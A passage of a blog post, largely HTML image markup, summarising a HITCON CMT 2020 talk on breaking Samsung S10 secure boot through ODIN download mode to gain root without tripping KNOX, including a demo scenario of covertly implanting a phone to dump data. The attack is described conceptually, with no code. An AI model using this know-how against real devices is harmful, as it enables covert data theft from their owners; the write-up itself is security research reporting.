    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/E3C78D63AD19E52D90910170E2228D361C43D0A07840D7E4E477E7CCF3EAE9ED-400-8f7d7cfdc.jpg 400w, /generated/assets/images/posts/hitcon-cmt-2020/E3C78D63AD19E52D90910170E2228D361C43D0A07840D7E4E477E7CCF3EAE9ED-600-8f7d7cfdc.jpg 600w, /generated/assets/images/posts/hitcon-cmt-2020/E3C78D63AD19E52D90910170E2228D361C43D0A07840D7E4E477E7CCF3EAE9ED-800-8f7d7cfdc.jpg 800w, /generated/assets/images/posts/hitcon-cmt-2020/E3C78D63AD19E52D90910170E2228D361C43D0A07840D7E4E477E7CCF3EAE9ED-1000-8f7d7cfdc.jpg 1000w" type="image/jpeg" />
    <img class="lazy" src="/generated/assets/images/posts/hitcon-cmt-2020/E3C78D63AD19E52D90910170E2228D361C43D0A07840D7E4E477E7CCF3EAE9ED-800-8f7d7cfdc.jpg" width="1256" height="538" />
  </picture>
</a>

  <figcaption>Click to see the full agenda.</figcaption>
</figure>

<h3 id="exploiting-samsung-s10-secure-boot-root-wo-tripping-knox">Exploiting Samsung S10 Secure Boot (Root w/o Tripping KNOX)</h3>

<p class="notice--warning"><strong>⚠ Warning</strong> Incoming rant. Skip two paragraphs if you only want to hear the details of the talk and my thoughts on it.</p>

<p>Before I get into the talk, I’d like to talk about one of the reasons why I refuse to buy a Samsung device - lack of developer freedom. Sure, they offer revolutionary hardware and had brought us amazing devices like the Galaxy Z Flip 2 that was recently launched, but they are very stringent on “security.” Perhaps the best example for this argument is KNOX, an e-fuse that is blown should the user decide to unlock their bootloader. KNOX is a stored in a write-once memory chip, so once the fuse has been tripped, it is impossible to reset the fuse state without replacing the entire board.</p>

<p>I never really understood how this increases the overall “security” of the device. I can understand the standard Android approach where a warning has to be displayed when the bootloader is unlocked, as it warns the user that the device may be or may have been tampered with. I can also understand the benefit that KNOX may bring, such as invalidating the security keys used to encrypt user-space content to erase contents of secured folder. I get that. But does it have to be a permanent thing? If the fuse is blown, Samsung can reject your warranty request just because you tried to unlock your bootloader and flashed something else. What if I <em>didn’t</em> want OneUI? The consumer should have a choice in doing so and not be tied with this crap.</p>

<figure>
  <a href="/assets/images/posts/hitcon-cmt-2020/6B43C4AF6D8DF02B2AF14BA84BCB7F0AC60A2234140746916771D73AEB3FF3EC.jpg">
  <picture>
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/6B43C4AF6D8DF02B2AF14BA84BCB7F0AC60A2234140746916771D73AEB3FF3EC-400-aa046367f.webp 400w, /generated/assets/images/posts/hitcon-cmt-2020/6B43C4AF6D8DF02B2AF14BA84BCB7F0AC60A2234140746916771D73AEB3FF3EC-600-aa046367f.webp 600w, /generated/assets/images/posts/hitcon-cmt-2020/6B43C4AF6D8DF02B2AF14BA84BCB7F0AC60A2234140746916771D73AEB3FF3EC-800-aa046367f.webp 800w, /generated/assets/images/posts/hitcon-cmt-2020/6B43C4AF6D8DF02B2AF14BA84BCB7F0AC60A2234140746916771D73AEB3FF3EC-1000-aa046367f.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/6B43C4AF6D8DF02B2AF14BA84BCB7F0AC60A2234140746916771D73AEB3FF3EC-400-454682c1a.jpg 400w, /generated/assets/images/posts/hitcon-cmt-2020/6B43C4AF6D8DF02B2AF14BA84BCB7F0AC60A2234140746916771D73AEB3FF3EC-600-454682c1a.jpg 600w, /generated/assets/images/posts/hitcon-cmt-2020/6B43C4AF6D8DF02B2AF14BA84BCB7F0AC60A2234140746916771D73AEB3FF3EC-800-454682c1a.jpg 800w, /generated/assets/images/posts/hitcon-cmt-2020/6B43C4AF6D8DF02B2AF14BA84BCB7F0AC60A2234140746916771D73AEB3FF3EC-1000-454682c1a.jpg 1000w" type="image/jpeg" />
    <img class="lazy" src="/generated/assets/images/posts/hitcon-cmt-2020/6B43C4AF6D8DF02B2AF14BA84BCB7F0AC60A2234140746916771D73AEB3FF3EC-800-454682c1a.jpg" width="2448" height="1049" />
  </picture>
</a>

  <figcaption>Status of the KNOX e-fuse bit under ODIN mode (Source: unlockguy.net).</figcaption>
</figure>

<p>Anyways, now that we know that KNOX is a write-once-only bit on a chip that is tripped when a bootloader unlock or root attempt is detected, let’s move on. I chose to tune in to this talk because I had some prior knowledge regarding how Android handles its bootloading process (<code class="language-plaintext highlighter-rouge">dm-verity</code> and whatnot) and was curious to see how the researcher was able to not only defeat KNOX but also how Samsung handled the entire case.</p>

<p>The researcher, Jeffxx, first demoed how this type of execution could be carried out in a real-world scenario. For instance, say Bob’s phone is dead and he wants to borrow Alice’s charger. Alice’s like, “sure, you go relax, and I’ll plug it up.” Bob goes away for a coffee while Alice enters ODIN mode on the device, pushes the malicious code, and reboots the device. After a while, Bob returns and asks for his phone. Bob unlocks his device and goes on about his day. Meanwhile, Alice has already prepared a script that dumps information from the phone remotely after the device has been unlocked. Mission complete! All of this was demonstrated in a pre-filmed video with actual acting. I love the effort that was put into the talk.</p>

<figure class="third">
  <a href="/assets/images/posts/hitcon-cmt-2020/F0109DA1C2BDC700BC650AFB0400AA145A39E164AA7B5C075FBCB80E6CC5D853.jpg">
  <picture>
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/F0109DA1C2BDC700BC650AFB0400AA145A39E164AA7B5C075FBCB80E6CC5D853-400-f2706e863.webp 400w, /generated/assets/images/posts/hitcon-cmt-2020/F0109DA1C2BDC700BC650AFB0400AA145A39E164AA7B5C075FBCB80E6CC5D853-600-f2706e863.webp 600w, /generated/assets/images/posts/hitcon-cmt-2020/F0109DA1C2BDC700BC650AFB0400AA145A39E164AA7B5C075FBCB80E6CC5D853-800-f2706e863.webp 800w, /generated/assets/images/posts/hitcon-cmt-2020/F0109DA1C2BDC700BC650AFB0400AA145A39E164AA7B5C075FBCB80E6CC5D853-1000-f2706e863.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/F0109DA1C2BDC700BC650AFB0400AA145A39E164AA7B5C075FBCB80E6CC5D853-400-cee4cebc6.jpg 400w, /generated/assets/images/posts/hitcon-cmt-2020/F0109DA1C2BDC700BC650AFB0400AA145A39E164AA7B5C075FBCB80E6CC5D853-600-cee4cebc6.jpg 600w, /generated/assets/images/posts/hitcon-cmt-2020/F0109DA1C2BDC700BC650AFB0400AA145A39E164AA7B5C075FBCB80E6CC5D853-800-cee4cebc6.jpg 800w, /generated/assets/images/posts/hitcon-cmt-2020/F0109DA1C2BDC700BC650AFB0400AA145A39E164AA7B5C075FBCB80E6CC5D853-1000-cee4cebc6.jpg 1000w" type="image/jpeg" />
    <img class="lazy" src="/generated/assets/images/posts/hitcon-cmt-2020/F0109DA1C2BDC700BC650AFB0400AA145A39E164AA7B5C075FBCB80E6CC5D853-800-cee4cebc6.jpg" width="4032" height="2268" />
  </picture>
</a>

  <a href="/assets/images/posts/hitcon-cmt-2020/A8B3CC0D9E0DADCABBF5A406951B455EC7222DF76FFBA8AB955FD92601771FD1.jpg">
  <picture>
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/A8B3CC0D9E0DADCABBF5A406951B455EC7222DF76FFBA8AB955FD92601771FD1-400-7e0f29d2c.webp 400w, /generated/assets/images/posts/hitcon-cmt-2020/A8B3CC0D9E0DADCABBF5A406951B455EC7222DF76FFBA8AB955FD92601771FD1-600-7e0f29d2c.webp 600w, /generated/assets/images/posts/hitcon-cmt-2020/A8B3CC0D9E0DADCABBF5A406951B455EC7222DF76FFBA8AB955FD92601771FD1-800-7e0f29d2c.webp 800w, /generated/assets/images/posts/hitcon-cmt-2020/A8B3CC0D9E0DADCABBF5A406951B455EC7222DF76FFBA8AB955FD92601771FD1-1000-7e0f29d2c.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/A8B3CC0D9E0DADCABBF5A406951B455EC7222DF76FFBA8AB955FD92601771FD1-400-b3df0f089.jpg 400w, /generated/assets/images/posts/hitcon-cmt-2020/A8B3CC0D9E0DADCABBF5A406951B455EC7222DF76FFBA8AB955FD92601771FD1-600-b3df0f089.jpg 600w, /generated/assets/images/posts/hitcon-cmt-2020/A8B3CC0D9E0DADCABBF5A406951B455EC7222DF76FFBA8AB955FD92601771FD1-800-b3df0f089.jpg 800w, /generated/assets/images/posts/hitcon-cmt-2020/A8B3CC0D9E0DADCABBF5A406951B455EC7222DF76FFBA8AB955FD92601771FD1-1000-b3df0f089.jpg 1000w" type="image/jpeg" />
    <img class="lazy" src="/generated/assets/images/posts/hitcon-cmt-2020/A8B3CC0D9E0DADCABBF5A406951B455EC7222DF76FFBA8AB955FD92601771FD1-800-b3df0f089.jpg" width="4032" height="2268" />
  </picture>
</a>

  <a href="/assets/images/posts/hitcon-cmt-2020/CBEBB2D290774C42D74D64CB9E858E7E102720EF198DF27F7159DAD9358BFA7D.jpg">
  <picture>
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/CBEBB2D290774C42D74D64CB9E858E7E102720EF198DF27F7159DAD9358BFA7D-400-140424428.webp 400w, /generated/assets/images/posts/hitcon-cmt-2020/CBEBB2D290774C42D74D64CB9E858E7E102720EF198DF27F7159DAD9358BFA7D-600-140424428.webp 600w, /generated/assets/images/posts/hitcon-cmt-2020/CBEBB2D290774C42D74D64CB9E858E7E102720EF198DF27F7159DAD9358BFA7D-800-140424428.webp 800w, /generated/assets/images/posts/hitcon-cmt-2020/CBEBB2D290774C42D74D64CB9E858E7E102720EF198DF27F7159DAD9358BFA7D-1000-140424428.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/CBEBB2D290774C42D74D64CB9E858E7E102720EF198DF27F7159DAD9358BFA7D-400-cff173141.jpg 400w, /generated/assets/images/posts/hitcon-cmt-2020/CBEBB2D290774C42D74D64CB9E858E7E102720EF198DF27F7159DAD9358BFA7D-600-cff173141.jpg 600w, /generated/assets/images/posts/hitcon-cmt-2020/CBEBB2D290774C42D74D64CB9E858E7E102720EF198DF27F7159DAD9358BFA7D-800-cff173141.jpg 800w, /generated/assets/images/posts/hitcon-cmt-2020/CBEBB2D290774C42D74D64CB9E858E7E102720EF198DF27F7159DAD9358BFA7D-1000-cff173141.jpg 1000w" type="image/jpeg" />
    <img class="lazy" src="/generated/assets/images/posts/hitcon-cmt-2020/CBEBB2D290774C42D74D64CB9E858E7E102720EF198DF27F7159DAD9358BFA7D-800-cff173141.jpg" width="4032" height="2268" />
  </picture>
</a>

  <figcaption>Agenda &amp; demo of the attack</figcaption>
</figure>

<p>After the demo, Jeffxx did a quick explanation on the boot process of a modern Samsung device. Like any other modern secure device, there is a chain of trust involved. If the onboard Secure Boot passes the necessary security check, the bootloader then passes this signal to the kernel, then DM-verity takes care of the system integrity check, and if the integrity check passes, Android boots.</p>

<p class="notice--info"><strong>ℹ Information</strong> For a more detailed explanation on how Android performs its boot verification checks using dm-verity, see <a href="https://source.android.com/security/verifiedboot/dm-verity">Implementing dm-verity</a> and <a href="https://source.android.com/security/verifiedboot/verified-boot">Verifying Boot</a> on the official Android SDK docs. Note that the booting process explained in the documentation does <strong>not</strong> relate to Samsung’s KNOX and TrustZone implementation. The Samsung implementation occurs before the dm-verity stage.</p>

<figure class="half">
  <a href="/assets/images/posts/hitcon-cmt-2020/083BEAB0B96E0A92A2C601AA4DDC1068D047F08E6E7683A61350E14876F0BF19.png">
  <picture>
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/083BEAB0B96E0A92A2C601AA4DDC1068D047F08E6E7683A61350E14876F0BF19-400-ce3d61b4c.webp 400w, /generated/assets/images/posts/hitcon-cmt-2020/083BEAB0B96E0A92A2C601AA4DDC1068D047F08E6E7683A61350E14876F0BF19-600-ce3d61b4c.webp 600w, /generated/assets/images/posts/hitcon-cmt-2020/083BEAB0B96E0A92A2C601AA4DDC1068D047F08E6E7683A61350E14876F0BF19-800-ce3d61b4c.webp 800w, /generated/assets/images/posts/hitcon-cmt-2020/083BEAB0B96E0A92A2C601AA4DDC1068D047F08E6E7683A61350E14876F0BF19-1000-ce3d61b4c.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/083BEAB0B96E0A92A2C601AA4DDC1068D047F08E6E7683A61350E14876F0BF19-400-0cb2e056b.png 400w, /generated/assets/images/posts/hitcon-cmt-2020/083BEAB0B96E0A92A2C601AA4DDC1068D047F08E6E7683A61350E14876F0BF19-600-0cb2e056b.png 600w, /generated/assets/images/posts/hitcon-cmt-2020/083BEAB0B96E0A92A2C601AA4DDC1068D047F08E6E7683A61350E14876F0BF19-800-0cb2e056b.png 800w, /generated/assets/images/posts/hitcon-cmt-2020/083BEAB0B96E0A92A2C601AA4DDC1068D047F08E6E7683A61350E14876F0BF19-1000-0cb2e056b.png 1000w" type="image/png" />
    <img class="lazy" src="/generated/assets/images/posts/hitcon-cmt-2020/083BEAB0B96E0A92A2C601AA4DDC1068D047F08E6E7683A61350E14876F0BF19-800-0cb2e056b.png" width="2400" height="1350" />
  </picture>
</a>

  <a href="/assets/images/posts/hitcon-cmt-2020/14BF02CABB7F59481050D1F89FEBB6A3C9F047BB9587DE20E22D4AE56431357D.png">
  <picture>
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/14BF02CABB7F59481050D1F89FEBB6A3C9F047BB9587DE20E22D4AE56431357D-400-187ab47b9.webp 400w, /generated/assets/images/posts/hitcon-cmt-2020/14BF02CABB7F59481050D1F89FEBB6A3C9F047BB9587DE20E22D4AE56431357D-600-187ab47b9.webp 600w, /generated/assets/images/posts/hitcon-cmt-2020/14BF02CABB7F59481050D1F89FEBB6A3C9F047BB9587DE20E22D4AE56431357D-800-187ab47b9.webp 800w, /generated/assets/images/posts/hitcon-cmt-2020/14BF02CABB7F59481050D1F89FEBB6A3C9F047BB9587DE20E22D4AE56431357D-1000-187ab47b9.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/14BF02CABB7F59481050D1F89FEBB6A3C9F047BB9587DE20E22D4AE56431357D-400-a27ae23eb.png 400w, /generated/assets/images/posts/hitcon-cmt-2020/14BF02CABB7F59481050D1F89FEBB6A3C9F047BB9587DE20E22D4AE56431357D-600-a27ae23eb.png 600w, /generated/assets/images/posts/hitcon-cmt-2020/14BF02CABB7F59481050D1F89FEBB6A3C9F047BB9587DE20E22D4AE56431357D-800-a27ae23eb.png 800w, /generated/assets/images/posts/hitcon-cmt-2020/14BF02CABB7F59481050D1F89FEBB6A3C9F047BB9587DE20E22D4AE56431357D-1000-a27ae23eb.png 1000w" type="image/png" />
    <img class="lazy" src="/generated/assets/images/posts/hitcon-cmt-2020/14BF02CABB7F59481050D1F89FEBB6A3C9F047BB9587DE20E22D4AE56431357D-800-a27ae23eb.png" width="2667" height="1500" />
  </picture>
</a>

  <figcaption>Samsung device chain of trust illustrated</figcaption>
</figure>

<p>As explained in Samsung’s various documentations (see <a href="https://nl.insight.com/content/dam/insight-web/nl_NL/learn/techbooks/security/Samsung_KNOX_platform_overzicht.pdf">An Overview of the Samsung KNOX Platform (2016)</a> whitepaper, <a href="https://docs.samsungknox.com/admin/whitepaper/kpe/sensitive-data-protection.htm">Sensitive Data Protection (SDP)</a>, <a href="https://docs.samsungknox.com/admin/knox-platform-for-enterprise/kbas/kba-360039577713.htm">File-based encryption (FBE) and full-disk encryption (FDE)</a>), newer Galaxy devices store the (partial? unsure) KNOX encryption/decryption key within the hardware. Once the user enters their credentials via the Android keyguard, storage spaces that have been encrypted using FBE (File-based Encryption) are then decrypted via the hardware-backed credential storage. The said key is purged from RAM when the device is locked.</p>

<p class="notice--danger">While it is not documented in the official documentation (at least I couldn’t find it), it seems that the keys are reset once the KNOX has been tripped. Therefore, data encrypted using FBE (e.g., Secure Folder) may not be retrieved after tripping KNOX.</p>

<p>In laymen’s term, sensitive data may not be retrieved if the following occurs:</p>

<ul>
  <li>KNOX e-fuse has been blown
    <ul>
      <li>Encryption/decryption keys reset</li>
    </ul>
  </li>
  <li>Device not yet unlocked by the user
    <ul>
      <li>Android-space, refers to Android keyguard status</li>
    </ul>
  </li>
</ul>

<figure class="third">
<a href="/assets/images/posts/hitcon-cmt-2020/ED6EBD16F0B87C2F71E32960E79D651ACA3EE77236C2785B0B59659CE8656F9B.png">
  <picture>
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/ED6EBD16F0B87C2F71E32960E79D651ACA3EE77236C2785B0B59659CE8656F9B-400-482b2e36e.webp 400w, /generated/assets/images/posts/hitcon-cmt-2020/ED6EBD16F0B87C2F71E32960E79D651ACA3EE77236C2785B0B59659CE8656F9B-600-482b2e36e.webp 600w, /generated/assets/images/posts/hitcon-cmt-2020/ED6EBD16F0B87C2F71E32960E79D651ACA3EE77236C2785B0B59659CE8656F9B-800-482b2e36e.webp 800w, /generated/assets/images/posts/hitcon-cmt-2020/ED6EBD16F0B87C2F71E32960E79D651ACA3EE77236C2785B0B59659CE8656F9B-845-482b2e36e.webp 845w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/ED6EBD16F0B87C2F71E32960E79D651ACA3EE77236C2785B0B59659CE8656F9B-400-a934b598e.png 400w, /generated/assets/images/posts/hitcon-cmt-2020/ED6EBD16F0B87C2F71E32960E79D651ACA3EE77236C2785B0B59659CE8656F9B-600-a934b598e.png 600w, /generated/assets/images/posts/hitcon-cmt-2020/ED6EBD16F0B87C2F71E32960E79D651ACA3EE77236C2785B0B59659CE8656F9B-800-a934b598e.png 800w, /generated/assets/images/posts/hitcon-cmt-2020/ED6EBD16F0B87C2F71E32960E79D651ACA3EE77236C2785B0B59659CE8656F9B-845-a934b598e.png 845w" type="image/png" />
    <img class="lazy" src="/generated/assets/images/posts/hitcon-cmt-2020/ED6EBD16F0B87C2F71E32960E79D651ACA3EE77236C2785B0B59659CE8656F9B-800-a934b598e.png" width="845" height="475" />
  </picture>
</a>

<a href="/assets/images/posts/hitcon-cmt-2020/2FE0F9F2EBB51683F37AE46362A7F9109FB2EC084BFD29AF07F70854C24792C3.png">
  <picture>
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/2FE0F9F2EBB51683F37AE46362A7F9109FB2EC084BFD29AF07F70854C24792C3-400-e98a8f731.webp 400w, /generated/assets/images/posts/hitcon-cmt-2020/2FE0F9F2EBB51683F37AE46362A7F9109FB2EC084BFD29AF07F70854C24792C3-600-e98a8f731.webp 600w, /generated/assets/images/posts/hitcon-cmt-2020/2FE0F9F2EBB51683F37AE46362A7F9109FB2EC084BFD29AF07F70854C24792C3-800-e98a8f731.webp 800w, /generated/assets/images/posts/hitcon-cmt-2020/2FE0F9F2EBB51683F37AE46362A7F9109FB2EC084BFD29AF07F70854C24792C3-953-e98a8f731.webp 953w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/2FE0F9F2EBB51683F37AE46362A7F9109FB2EC084BFD29AF07F70854C24792C3-400-941d03850.png 400w, /generated/assets/images/posts/hitcon-cmt-2020/2FE0F9F2EBB51683F37AE46362A7F9109FB2EC084BFD29AF07F70854C24792C3-600-941d03850.png 600w, /generated/assets/images/posts/hitcon-cmt-2020/2FE0F9F2EBB51683F37AE46362A7F9109FB2EC084BFD29AF07F70854C24792C3-800-941d03850.png 800w, /generated/assets/images/posts/hitcon-cmt-2020/2FE0F9F2EBB51683F37AE46362A7F9109FB2EC084BFD29AF07F70854C24792C3-953-941d03850.png 953w" type="image/png" />
    <img class="lazy" src="/generated/assets/images/posts/hitcon-cmt-2020/2FE0F9F2EBB51683F37AE46362A7F9109FB2EC084BFD29AF07F70854C24792C3-800-941d03850.png" width="953" height="536" />
  </picture>
</a>

<a href="/assets/images/posts/hitcon-cmt-2020/F6810A8B10D197498598158C3FB8B7CAB8FF340901919355090C59466D1DDC26.png">
  <picture>
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/F6810A8B10D197498598158C3FB8B7CAB8FF340901919355090C59466D1DDC26-400-97241d973.webp 400w, /generated/assets/images/posts/hitcon-cmt-2020/F6810A8B10D197498598158C3FB8B7CAB8FF340901919355090C59466D1DDC26-600-97241d973.webp 600w, /generated/assets/images/posts/hitcon-cmt-2020/F6810A8B10D197498598158C3FB8B7CAB8FF340901919355090C59466D1DDC26-800-97241d973.webp 800w, /generated/assets/images/posts/hitcon-cmt-2020/F6810A8B10D197498598158C3FB8B7CAB8FF340901919355090C59466D1DDC26-1000-97241d973.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/F6810A8B10D197498598158C3FB8B7CAB8FF340901919355090C59466D1DDC26-400-7ae4bb1f1.png 400w, /generated/assets/images/posts/hitcon-cmt-2020/F6810A8B10D197498598158C3FB8B7CAB8FF340901919355090C59466D1DDC26-600-7ae4bb1f1.png 600w, /generated/assets/images/posts/hitcon-cmt-2020/F6810A8B10D197498598158C3FB8B7CAB8FF340901919355090C59466D1DDC26-800-7ae4bb1f1.png 800w, /generated/assets/images/posts/hitcon-cmt-2020/F6810A8B10D197498598158C3FB8B7CAB8FF340901919355090C59466D1DDC26-1000-7ae4bb1f1.png 1000w" type="image/png" />
    <img class="lazy" src="/generated/assets/images/posts/hitcon-cmt-2020/F6810A8B10D197498598158C3FB8B7CAB8FF340901919355090C59466D1DDC26-800-7ae4bb1f1.png" width="2667" height="1500" />
  </picture>
</a>

<figcaption>KNOX security overview</figcaption>
</figure>

<p>So, the challenge here is to a) obtain root without alerting KNOX b) plant files under decrypted storage space. The attacker has to achieve the above in order to access sensitive information stored on the device <strong>before TrustZone initialization</strong>.</p>

<p>There are very few attack surfaces in a pre-boot environment. Jeffxx decided to tackle this attack from the ODIN download mode.</p>

<p class="notice--info"><strong>ℹ Information</strong> Samsung’s ODIN mode is used to flash stock firmware signed by Samsung - and as noted by the official whitepaper, a rollback prevention e-fuse is in place, so version rollback is not possible.</p>

<figure class="half">
<a href="/assets/images/posts/hitcon-cmt-2020/3FAE138CBE70AAB02F728D323C5724584767D26C4B35A685F583FABF39C237D8.png">
  <picture>
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/3FAE138CBE70AAB02F728D323C5724584767D26C4B35A685F583FABF39C237D8-400-ad00fd1a3.webp 400w, /generated/assets/images/posts/hitcon-cmt-2020/3FAE138CBE70AAB02F728D323C5724584767D26C4B35A685F583FABF39C237D8-600-ad00fd1a3.webp 600w, /generated/assets/images/posts/hitcon-cmt-2020/3FAE138CBE70AAB02F728D323C5724584767D26C4B35A685F583FABF39C237D8-800-ad00fd1a3.webp 800w, /generated/assets/images/posts/hitcon-cmt-2020/3FAE138CBE70AAB02F728D323C5724584767D26C4B35A685F583FABF39C237D8-1000-ad00fd1a3.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/3FAE138CBE70AAB02F728D323C5724584767D26C4B35A685F583FABF39C237D8-400-18eafcf2a.png 400w, /generated/assets/images/posts/hitcon-cmt-2020/3FAE138CBE70AAB02F728D323C5724584767D26C4B35A685F583FABF39C237D8-600-18eafcf2a.png 600w, /generated/assets/images/posts/hitcon-cmt-2020/3FAE138CBE70AAB02F728D323C5724584767D26C4B35A685F583FABF39C237D8-800-18eafcf2a.png 800w, /generated/assets/images/posts/hitcon-cmt-2020/3FAE138CBE70AAB02F728D323C5724584767D26C4B35A685F583FABF39C237D8-1000-18eafcf2a.png 1000w" type="image/png" />
    <img class="lazy" src="/generated/assets/images/posts/hitcon-cmt-2020/3FAE138CBE70AAB02F728D323C5724584767D26C4B35A685F583FABF39C237D8-800-18eafcf2a.png" width="1280" height="720" />
  </picture>
</a>

<a href="/assets/images/posts/hitcon-cmt-2020/07ECEC32818C670A131815C9A09530577748F4C41D1AB6575B864E970BACA9DE.png">
  <picture>
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/07ECEC32818C670A131815C9A09530577748F4C41D1AB6575B864E970BACA9DE-400-1e4120e15.webp 400w, /generated/assets/images/posts/hitcon-cmt-2020/07ECEC32818C670A131815C9A09530577748F4C41D1AB6575B864E970BACA9DE-600-1e4120e15.webp 600w, /generated/assets/images/posts/hitcon-cmt-2020/07ECEC32818C670A131815C9A09530577748F4C41D1AB6575B864E970BACA9DE-800-1e4120e15.webp 800w, /generated/assets/images/posts/hitcon-cmt-2020/07ECEC32818C670A131815C9A09530577748F4C41D1AB6575B864E970BACA9DE-1000-1e4120e15.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/07ECEC32818C670A131815C9A09530577748F4C41D1AB6575B864E970BACA9DE-400-0c70d12d0.png 400w, /generated/assets/images/posts/hitcon-cmt-2020/07ECEC32818C670A131815C9A09530577748F4C41D1AB6575B864E970BACA9DE-600-0c70d12d0.png 600w, /generated/assets/images/posts/hitcon-cmt-2020/07ECEC32818C670A131815C9A09530577748F4C41D1AB6575B864E970BACA9DE-800-0c70d12d0.png 800w, /generated/assets/images/posts/hitcon-cmt-2020/07ECEC32818C670A131815C9A09530577748F4C41D1AB6575B864E970BACA9DE-1000-0c70d12d0.png 1000w" type="image/png" />
    <img class="lazy" src="/generated/assets/images/posts/hitcon-cmt-2020/07ECEC32818C670A131815C9A09530577748F4C41D1AB6575B864E970BACA9DE-800-0c70d12d0.png" width="7200" height="4050" />
  </picture>
</a>

<figcaption>ODIN as an attack vector</figcaption>
</figure>

<p class="notice--info"><strong>ℹ Information</strong> I won’t dive too deep into the details in the following sections, as it is totally above my pay grade. A more detailed explanation can be found in Jeffxx’s <a href="https://i.blackhat.com/USA-20/Wednesday/us-20-Chao-Breaking-Samsungs-Root-Of-Trust-Exploiting-Samsung-Secure-Boot.pdf">full slide released at Blackhat 2020</a>.</p>

<p>Through multiple weak ODIN image checks, improper vulnerability patches, and physical hardware glitches (nothing fancy, literally just disconnecting the USB cable at the right time), it is possible to perform arbitrary code execution through overflows. With this in mind, all that’s left is for the user to unlock the device to access the key stored in the credential guard. It’s even possible to chain the vulnerability with known vulns if the user refuses to update. Unfortunately, Samsung still didn’t quite get the bug fixed. It took almost a year for the bugs to be properly patched (see <code class="language-plaintext highlighter-rouge">SVE-2019-15872</code>, <code class="language-plaintext highlighter-rouge">SVE-2020-16712</code>).</p>

<figure class="third">
  <a href="/assets/images/posts/hitcon-cmt-2020/3fcc39d43ad553bab53fd5a4a30d8eba33007ed165d4ab672ae1862283c65e76.png">
  <picture>
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/3fcc39d43ad553bab53fd5a4a30d8eba33007ed165d4ab672ae1862283c65e76-400-efcaa0b20.webp 400w, /generated/assets/images/posts/hitcon-cmt-2020/3fcc39d43ad553bab53fd5a4a30d8eba33007ed165d4ab672ae1862283c65e76-600-efcaa0b20.webp 600w, /generated/assets/images/posts/hitcon-cmt-2020/3fcc39d43ad553bab53fd5a4a30d8eba33007ed165d4ab672ae1862283c65e76-800-efcaa0b20.webp 800w, /generated/assets/images/posts/hitcon-cmt-2020/3fcc39d43ad553bab53fd5a4a30d8eba33007ed165d4ab672ae1862283c65e76-1000-efcaa0b20.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/3fcc39d43ad553bab53fd5a4a30d8eba33007ed165d4ab672ae1862283c65e76-400-c910f24a5.png 400w, /generated/assets/images/posts/hitcon-cmt-2020/3fcc39d43ad553bab53fd5a4a30d8eba33007ed165d4ab672ae1862283c65e76-600-c910f24a5.png 600w, /generated/assets/images/posts/hitcon-cmt-2020/3fcc39d43ad553bab53fd5a4a30d8eba33007ed165d4ab672ae1862283c65e76-800-c910f24a5.png 800w, /generated/assets/images/posts/hitcon-cmt-2020/3fcc39d43ad553bab53fd5a4a30d8eba33007ed165d4ab672ae1862283c65e76-1000-c910f24a5.png 1000w" type="image/png" />
    <img class="lazy" src="/generated/assets/images/posts/hitcon-cmt-2020/3fcc39d43ad553bab53fd5a4a30d8eba33007ed165d4ab672ae1862283c65e76-800-c910f24a5.png" width="2112" height="1188" />
  </picture>
</a>

  <a href="/assets/images/posts/hitcon-cmt-2020/8f9cd63f0e5e39d5d16facb3d263e916c9c97f780b874ff04b0eeb4a6c6c1b32.png">
  <picture>
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/8f9cd63f0e5e39d5d16facb3d263e916c9c97f780b874ff04b0eeb4a6c6c1b32-400-610715c1b.webp 400w, /generated/assets/images/posts/hitcon-cmt-2020/8f9cd63f0e5e39d5d16facb3d263e916c9c97f780b874ff04b0eeb4a6c6c1b32-600-610715c1b.webp 600w, /generated/assets/images/posts/hitcon-cmt-2020/8f9cd63f0e5e39d5d16facb3d263e916c9c97f780b874ff04b0eeb4a6c6c1b32-800-610715c1b.webp 800w, /generated/assets/images/posts/hitcon-cmt-2020/8f9cd63f0e5e39d5d16facb3d263e916c9c97f780b874ff04b0eeb4a6c6c1b32-1000-610715c1b.webp 1000w" type="image/webp" />
    <source srcset="/generated/assets/images/posts/hitcon-cmt-2020/8f9cd63f0e5e39d5d16facb3d263e916c9c97f780b874ff04b0eeb4a6c6c1b32-400-fe9ff81f8.png 400w, /generated/assets/images/posts/hitcon-cmt-2020/8f9cd63f0e5e39d5d16facb3d263e916c9c97f780b874ff04b0eeb4a6c6c1b32-600-fe9ff81f8.png 600w, /generated/assets/images/posts/hitcon-cmt-2020/8f9cd63f0e5e39d5d16facb3d263e916c9c97f780b874ff04b0eeb4a6c6c1b32-800-fe9ff81f8.png 800w, /generated/assets/images/posts/hitcon-cmt-2020/8f9cd63f0e5e39d5d16facb3d263e916c9c97f780b874ff04b0eeb4a6c6c1b32-1000-fe9ff81f8.png 1000w" type="image/png" />
